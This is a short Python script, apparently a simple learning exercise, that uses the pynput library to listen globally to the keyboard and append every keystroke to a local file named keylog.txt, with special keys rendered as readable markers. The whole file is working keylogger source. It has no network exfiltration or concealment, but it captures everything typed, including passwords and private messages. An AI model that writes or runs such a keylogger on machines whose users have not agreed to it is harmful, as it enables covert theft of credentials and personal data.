import pynput
import logging
from pynput.keyboard import Listener, Key

#Create file for storing input
filename = "keylog.txt"


def on_press(key):
    #opens file to start recording input
    f = open(filename, 'a')
    #if statment to print record input to something readable
    if hasattr(key, 'char'):
        f.write(key.char)
    elif key == key.space:
        f.write(' ')
    elif key == key.backspace:
        f.write('<')
    elif key == key.enter:
        f.write('\n')
    elif key == key.tab:
        f.write('\t')
    else:
        f.write('[' + key.name + ']')
    #closes file
    f.close()

#setup for listener to work
with Listener(on_press=on_press) as listener:
    listener.join()